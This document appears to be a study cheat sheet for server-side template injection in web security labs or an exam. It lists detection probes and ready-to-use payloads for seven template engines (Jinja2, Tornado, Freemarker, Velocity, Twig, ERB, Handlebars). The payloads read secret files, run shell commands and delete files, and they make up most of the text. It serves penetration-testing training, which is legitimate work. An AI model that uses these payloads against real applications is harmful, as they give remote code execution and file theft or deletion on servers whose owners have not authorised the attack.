## 🎯 Target Location

**Primary Target:** Product details page - "Unfortunately this product is out of stock" message

## 🔍 Detection

### Template Expression Testing
Try these payloads to detect SSTI:

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
```

**If you see `49` in response** → SSTI confirmed!

## 🔥 Exploitation Payloads

### Jinja2 (Python)

**Read File:**
```python
{{ ''.__class__.__mro__[1].__subclasses__()[40]('/home/carlos/secret').read() }}
```

**RCE:**
```python
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/carlos/secret').read() }}
```

### Tornado (Python)

```python
{{__import__('os').system('bash -c "rm /home/carlos/morale.txt"')}}
```

---

### Freemarker (Java)

**RCE:**
```java
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /home/carlos/secret") }
```

---

### Velocity (Java)
**RCE:**
```java
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($ex=$rt.getRuntime().exec('cat /home/carlos/secret'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

---

### Twig (PHP)
**RCE:**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /home/carlos/secret")}}
```

---

### ERB (Ruby)
**RCE:**
```ruby
<%= system('cat /home/carlos/secret') %>
<%= `cat /home/carlos/secret` %>
```

---

### Handlebars (Node.js)
**RCE (Delete File):**
```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

**How it works:**
- Exploits Handlebars helper functions
- Accesses `Function.constructor`
- Executes arbitrary Node.js code
- Uses `child_process.exec()` for RCE

## 🎓 Exam Tips

1. **Test template expressions first** - `{{7*7}}`, `${7*7}`, etc.
2. **Use HackTricks** - Comprehensive SSTI payloads for all engines
3. **Check product details page** - "Out of stock" message is common location
4. **Try multiple engines** - If one doesn't work, try another

---
